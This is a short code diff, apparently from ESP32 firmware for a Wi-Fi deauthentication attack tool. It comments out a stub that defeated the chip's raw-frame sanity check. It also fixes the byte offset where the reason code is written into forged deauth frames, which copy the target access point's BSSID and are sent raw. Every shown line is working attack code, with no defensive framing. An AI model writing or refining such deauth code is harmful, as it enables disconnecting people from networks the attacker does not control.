@@ -4292,9 +4292,9 @@ static void deautherOpenTarget(int index) {
   drawAttackScreen();
 }
 
-extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
-    return 0;
-}
+// extern "C" int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
+//     return 0;
+// }
 
 void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
     esp_err_t res = esp_wifi_80211_tx(WIFI_IF_AP, frame_buffer, size, false);
@@ -4313,7 +4313,7 @@ void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record, uint8_t c
     memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
     memcpy(&deauth_frame[10], ap_record->bssid, 6);
     memcpy(&deauth_frame[16], ap_record->bssid, 6);
-    deauth_frame[26] = 7;
+    deauth_frame[24] = 7;
 
     wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame));
 }
